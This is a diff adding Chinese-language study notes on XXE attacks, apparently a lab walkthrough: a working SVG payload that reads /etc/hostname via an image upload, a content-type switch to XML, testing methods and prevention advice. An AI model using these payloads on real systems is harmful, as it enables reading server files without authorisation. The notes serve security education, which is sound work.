@@ -361,3 +361,112 @@ gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
 "
 ```
 
+
+
+## 文件上传攻击
+
+某些应用程序允许用户上传文件，并在服务器端对文件进行处理。一些常见文件格式采用XML结构或包含XML子组件，例如基于XML的格式包括DOCX等Office文档格式和SVG等图像格式。
+
+以图像上传功能为例，应用程序可能在用户上传图片后，对PNG或JPEG等格式文件进行服务器端处理或验证。即使应用程序预期接收的是常规图片格式，其使用的图像处理库可能支持SVG格式解析。由于SVG本质是XML文件，攻击者可构造恶意SVG图像作为攻击载荷，借此触及潜在的XXE漏洞攻击面。
+
+
+
+**实验**
+
+本实验室允许用户发送评论时自定义头像（上传图片），并使用 Apache Batik 库处理头像图像文件。如果用户上传 SVG 格式（XML）的图片，会在解析后转换为 PNG 格式的图片。
+
+
+
+要解决实验，需要上传一张处理后显示的 `/etc/hostname` 文件内容的图片。创建一个包含以下内容的本地 SVG 图像：
+
+```
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
+
+
+
+这个SVG图像实际上是一个利用XML外部实体（XXE）漏洞的示例，其核心原理是借助XML解析器的特性来读取服务器本地文件。
+
+**XML声明与DOCTYPE定义**
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ 
+  <!ENTITY xxe SYSTEM "file:///etc/hostname" >
+]>
+```
+
+- `standalone="yes"` 表示文档不依赖外部DTD
+- 自定义实体 `xxe` 使用 `SYSTEM` 指令指向本地文件路径 `/etc/hostname`
+- 当XML解析器处理这个实体时，会尝试读取指定文件内容
+
+
+
+**SVG图形渲染部分**
+
+```
+<svg width="128px" height="128px" ...>
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+```
+
+- 通过 `&xxe;` 实体引用将文件内容注入到SVG文本元素中
+- 最终渲染的SVG图像会显示 `/etc/hostname` 文件的内容
+
+
+
+在博客文章上发表评论，并上传此图片作为头像。查看评论时，您应能在图像中看到 `/etc/hostname` 文件的内容。
+
+![image-20250316093807251](./images/XXE.assets/image-20250316093807251.png)
+
+
+
+## 内容类型
+
+大多数POST请求使用由HTML表单生成的默认内容类型（例如`application/x-www-form-urlencoded`）。部分网站虽然预期接收这种格式的请求，但也会兼容其他内容类型（包括XML格式）。
+
+
+
+例如，若常规请求如下所示：
+
+```
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+
+
+则您可能可以提交以下格式的请求并得到相同响应：
+
+```
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+```
+
+若应用程序兼容包含XML消息体的请求，并将消息体内容作为XML解析，那么仅通过将请求重构为XML格式，即可触及隐藏的XXE攻击面。
+
+
+
+## 发现漏洞
+
+绝大多数XXE漏洞可以通过Burp Suite的Web漏洞扫描器快速可靠地检测。
+
+手动测试XXE漏洞通常包括以下步骤：
+
+- **文件读取测试**：通过定义基于操作系统已知文件的外部实体，并在应用程序返回的数据中使用该实体（文件读取漏洞利用）。
+- **盲测 XXE 漏洞**：通过定义指向您控制系统的URL外部实体，并监控与该系统的交互行为（盲XXE漏洞检测）。Burp Collaborator正是实现此目的的完美工具
+- **XInclude 攻击测试**：当用户提供的非XML数据被服务端XML文档包含时，尝试通过XInclude攻击读取操作系统已知文件
+
+
+
+## 防范漏洞
+
+几乎所有XXE漏洞的产生，都是由于应用程序的XML解析库支持了非必要且具有潜在危险的XML功能所致。防范XXE攻击最简单有效的方法就是禁用这些冗余功能。
+
+通常而言，禁用外部实体解析（External Entity Resolution）并关闭对`XInclude`的支持即可达到防护效果。这可以通过配置选项实现，也可以通过编程方式覆盖默认行为。具体操作方法请查阅您使用的XML解析库或API的文档，了解如何禁用非必要功能模块。
